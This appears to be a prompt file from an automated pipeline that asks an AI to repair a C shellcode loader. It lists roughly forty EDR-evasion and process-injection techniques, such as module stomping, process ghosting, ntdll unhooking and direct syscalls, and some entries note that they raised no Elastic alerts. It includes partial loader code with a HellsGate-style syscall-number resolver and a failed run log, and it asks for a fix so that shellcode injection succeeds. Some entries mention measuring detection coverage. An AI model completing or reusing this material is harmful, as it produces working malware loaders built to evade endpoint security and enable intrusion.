@@ -1,0 +1,242 @@
+# Code Correction Task (Execution Failure)
+
+## Available Evasion Techniques (Reference)
+You may switch to a different technique if the current one is fundamentally broken.
+- **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
+    - **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions.
+    - **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory.
+    - **module_stomping_section_mapping**: Module Stomping via NtCreateSection(SEC_IMAGE)+NtMapViewOfSection. Maps the sacrificial DLL as an image section (file-backed, RX) without a LoadLibrary event; shellcode overwrites the mapped .text in place. Keeps the module off the PEB loader list and makes call-stack module resolution point at a legitimate DLL path.
+    - **module_stomping_fiber**: Module Stomping + Fiber: stomp a mapped image section, then start execution via CreateFiber/SwitchToFiber so no thread-creation telemetry is emitted. Workshop-verified combination that produced no Elastic alerts.
+    - **thread_hijacking_local**: Thread Hijacking (local): suspend an existing thread in the own process (e.g. created earlier or via CreateThread on a decoy), overwrite its RIP with the payload address via SetThreadContext, resume. Avoids a fresh thread-start pointing at unbacked memory.
+    - **apc_injection**: APC execution (self-injection): QueueUserAPC/NtQueueApcThread the payload address onto an alertable thread in the same process, then enter an alertable wait (SleepEx/WaitForSingleObjectEx). No new thread is created.
+    - **threadless_injection**: Threadless Injection (local variant): patch an existing function in a loaded module (or an unused callback slot, e.g. window proc) so the payload runs on a normal call path instead of a new thread. Pure-C feasible when targeting the own process; remote-process variants need handle ops and widen the detection surface.
+    - **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR.
+    - **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context.
+    - **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion.
+    - **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory).
+    - **dll_side_loading**: DLL side-loading: drop a payload-bearing DLL next to a signed binary that imports it, so execution flows under a trusted image name.
+    - **mockingjay**: Mockingjay: reuse an existing PAGE_EXECUTE_READWRITE section inside a signed DLL (e.g. msys-2.0.dll) — no VirtualAlloc/VirtualProtect at all; writes land in image-backed executable memory.
+    - **early_bird_apc**: Early Bird APC: spawn a signed host process suspended and queue an APC before its first thread runs, so the payload executes during process init — potentially before userland EDR hooks install.
+    - **ntdll_unhooking**: NTDLL unhooking: restore ntdll .text bytes from KnownDlls or a clean on-disk copy to remove inline EDR hooks before running the payload. Auxiliary step — combine with a staging technique.
+    - **direct_syscall** [USER-PREFERRED]: Direct/indirect syscalls (HellsGate-style): resolve SSNs from ntdll stubs and invoke the kernel without passing through hooked ntdll prologues. Does not affect kernel-level telemetry.
+    - **process_hollowing_remote**: Remote process hollowing (classic T1055): CreateProcess suspended, NtUnmapViewOfSection the original image, write replacement code, redirect entry, resume. Baseline to measure Elastic hollowing-rule coverage.
+    - **proxy_function_calls**: Execute sensitive APIs (NtCreateThread, etc.) through 'gadgets' in legitimate DLLs like ntdll.dll or kernel32.dll to evade return address filtering.
+    - **process_doppelganging**: Create file transaction, write shellcode, rollback transaction but keep section handle. Execute from transacted memory.
+    - **callback_execution**: Use legitimate callback functions (EnumWindows, EnumSystemLocales, etc.) with shellcode address.
+    - **module_overloading**: Map same DLL twice - once legitimate, once modified. Use legitimate handle for cover.
+    - **atom_bombing**: Atom bombing: store shellcode in the global atom table, then NtQueueApcThread a GlobalGetAtomNameW call into a target thread so the atom content is written inside the target process — no WriteProcessMemory.
+    - **tls_callback**: TLS callback execution: register a PIMAGE_TLS_CALLBACK in the .CRT$XL* section so the payload runs inside LdrpCallTlsInitializers before main — no thread/APC creation.
+    - **propagate**: PROPagate: store payload/subclass header in a target window's property list and trigger it via window messages — injection through the windowing subsystem, not process APIs.
+    - **process_ghosting**: Process ghosting: create a file, mark delete-pending, write a payload PE, build a SEC_IMAGE section from the delete-pending handle, then close — a process whose image has no on-disk file at all.
+    - **windows_hook_injection**: SetWindowsHookEx injection: the OS itself loads our hook DLL into a target GUI process when it pumps messages — no remote alloc/write APIs involved.
+    - **context_gadget**: SetThreadContext + gadget: redirect a thread's RIP into a jmp/call gadget inside a signed module so the first stack frame is module-backed even though control reaches the payload next.
+    - **exception_dispatch_exec**: Exception-dispatched execution: a VEH handler rewrites ContextRecord->Rip to the payload and returns CONTINUE_EXECUTION — control transfer happens inside KiUserExceptionDispatcher.
+    - **remote_section_mapping**: Remote section mapping: write payload in our own view of a section object, then NtMapViewOfSection the same section into the target — no VirtualAllocEx/WriteProcessMemory pair.
+    - **rundll32_hosting**: Signed host execution: drop a payload DLL and run it under rundll32/regsvr32 — the hosting process is a signed system binary, which may break unsigned-parent rule sequences.
+    - **suspended_section_exec**: Suspended-process section write: spawn signed host suspended, NtMapViewOfSection a payload section into it, redirect the main thread — hollowing-style exec without the loud NtUnmapViewOfSection call.
+    - **scattered_allocation**: Split shellcode across multiple small allocations. Reconstruct at runtime. Evades signature scanning.
+    - **read_only_trick**: Allocate as PAGE_READONLY, use hardware breakpoint or exception handler to execute. Very stealthy.
+    - **inherited_section_apc**: Inherited-Handle Section APC: pass a payload-carrying section into a suspended child via PROC_THREAD_ATTRIBUTE_HANDLE_LIST so the kernel duplicates the handle at process creation — no VirtualAllocEx/WriteProcessMemory/remote-map event exists. The child maps the section locally; trigger via early-bird APC or gadget/context redirect. Project-original composition.
+    - **self_reflection_exec**: Self-Reflection Execution: RtlCreateProcessReflection/RtlCloneUserProcess forks our own process after local staging — the payload is inherited at birth (COW), so no remote alloc/write/map call exists at all. StartRoutine option runs the payload inside the clone without a CreateThread-named call.
+    - **api_surface_translation**: API Surface Translation (meta): substitute every fingerprinted Win32 call with a documented modern twin (VirtualAlloc2, MapViewOfFile3, NtMapViewOfSectionEx, VirtualProtectFromApp, CreateFile2, NtCreateThreadEx flags, placeholder APIs) — tests whether rules match api.name strings. Applied on top of other techniques; one-iteration test per rule family.
+
+    ### USER PREFERRED TECHNIQUES (Prioritize these!)
+    - **direct_syscall**
+
+## Context
+The code compiled but failed during execution (crash, early exit, or shellcode loading failure).
+
+## Previous Code (C source that failed at runtime)
+```c
+#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+/* ------------------------------------------------------------------ */
+/* NT type / prototype declarations.                                   */
+/* ------------------------------------------------------------------ */
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
+#endif
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#endif
+#ifndef STATUS_INVALID_HANDLE
+#define STATUS_INVALID_HANDLE ((NTSTATUS)0xC0000008L)
+#endif
+
+#ifndef SEC_IMAGE
+#define SEC_IMAGE 0x01000000
+#endif
+#ifndef SEC_COMMIT
+#define SEC_COMMIT 0x08000000
+#endif
+
+#ifndef ViewShare
+#define ViewShare 1
+#endif
+
+typedef LONG NTSTATUS_LOCAL;
+
+typedef struct _MY_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} MY_UNICODE_STRING;
+
+typedef struct _MY_OBJECT_ATTRIBUTES {
+    ULONG               Length;
+    HANDLE              RootDirectory;
+    MY_UNICODE_STRING  *ObjectName;
+    ULONG               Attributes;
+    PVOID               SecurityDescriptor;
+    PVOID               SecurityQualityOfService;
+} MY_OBJECT_ATTRIBUTES;
+
+/* ------------------------------------------------------------------ */
+/* SSN resolver (HellsGate-style)                                      */
+/* ------------------------------------------------------------------ */
+
+typedef struct _SSN_ENTRY {
+    const char *name;
+    DWORD       ssn;
+} SSN_ENTRY;
+
+static SSN_ENTRY g_ssn_table[] = {
+    { "NtAllocateVirtualMemory", 0 },
+    { "NtProtectVirtualMemory",  0 },
+    { "NtCreateSection",         0 },
+    { "NtMapViewOfSection",      0 },
+    { "NtUnmapViewOfSection",    0 },
+    { "NtClose",                 0 },
+    { NULL, 0 }
+};
+
+static BOOL resolve_ssn(const char *func_name, DWORD *out_ssn)
+{
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return FALSE;
+
+    BYTE *base = (BYTE *)ntdll;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+
+    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+
+    IMAGE_DATA_DIRECTORY *exp_dir =
+        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (!exp_dir->VirtualAddress) return FALSE;
+
+    IMAGE_EXPORT_DIRECTORY *exp =
+        (IMAGE_EXPORT_DIRECTORY *)(base + exp_dir->VirtualAddress);
+
+    DWORD *names    = (DWORD *)(base + exp->AddressOfNames);
+    WORD  *ordinals = (WORD  *)(base + exp->AddressOfNameOrdinals);
+    DWORD *funcs    = (DWORD *)(base + exp->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        const char *name = (const char *)(base + names[i]);
+        if (strcmp(name, func_name) != 0) continue;
+
+        BYTE *stub = base + funcs[ordinals[i]];
+
+        /* Clean stub: 4C 8B D1 B8 <imm32> */
+        if (stub[0] == 0x4C && stub[1] == 0x8B &&
+            stub[2] == 0xD1 && stub[3] == 0xB8) {
+            DWORD ssn;
+            memcpy(&ssn, stub + 4, sizeof(ssn));
+            *out_ssn = ssn;
+            return TRUE;
+        }
+
+        /* Hooked stub fallback */
+        for (int k = 0; k < 31; k++) {
+            if (stub[k] == 0x0F && stub[k + 1] == 0x05) {
+                for (int j = k - 8; j >= 0; j--) {
+                    if (stub[j] == 0xB8) {
+                        DWORD ssn;
+                        memcpy(&ssn, stub + j + 1, sizeof(ssn));
+                        *out_ssn = ssn;
+                        return TRUE;
+                    }
+                }
+                break;
+            }
+        }
+        return FALSE;
+    }
+    return FALSE;
+}
+
+static BOOL resolve_all_ssns(void)
+{
+    for (int i = 0; g_ssn_table[i].name != NULL; i++) {
+        if (!resolve_ssn(g_ssn_table[i].name, &g_ssn_table[i].ssn)) {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static DWORD get_ssn(const char *name)
+{
+    for (int i = 0; g_ssn_table[i].name != NULL; i++) {
+        if (strcmp(g_ssn_table[i].name, name) == 0)
+            return g_ssn_table[i].ssn;
+    }
+    return 0xFFFFFFFF;
+}
+
+/* ------------------------------------------------------------------ */
+/* Trampolines                                                         */
+/* ------------------------------------------------------------------ */
+
+typedef NTSTATUS (NTAPI *pfn_NtAllocateVirtualMemory)(
+    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *pfn_NtProtectVirtualMemory)(
+    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS (NTAPI *pfn_NtCreateSection)(
+    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER,
+    ULONG, ULONG, HANDLE);
+typedef NTSTATUS (NTAPI *pfn_NtMapViewOfSection)(
+    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
+    PSIZE_T, DWORD, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *pfn_NtUnmapViewOfSection)(HANDLE, PVOID);
+typedef NTSTATUS (NTAPI *pfn_NtClose)(HANDLE);
+
+static pfn_NtAllocateVir
+
+... (truncated)
+```
+
+## Execution Output
+EXECUTION FAILED:
+section mapping failed
+
+
+EXIT_CODE: 1
+
+SUCCESS_DETAILS: {'process_expected': 'calc.exe', 'message': 'Process calc.exe was NOT spawned by this loader within 15s'}
+
+STDOUT:
+
+
+STDERR:
+section mapping failed
+
+
+## Task
+1. Analyze the runtime behavior.
+2. Identify the logical flaw or crash reason.
+3. Propose a fix to ensure successful execution (shellcode injection and thread start).
+
+## Output Format
+**Analysis**: [Explain the runtime failure]
+**Rule_Analysis**: N/A (Execution Error)
+**Technique**: BugFix
+**Methodology**: [Specific fix, e.g. "Fix memory alignment in VirtualAlloc"]
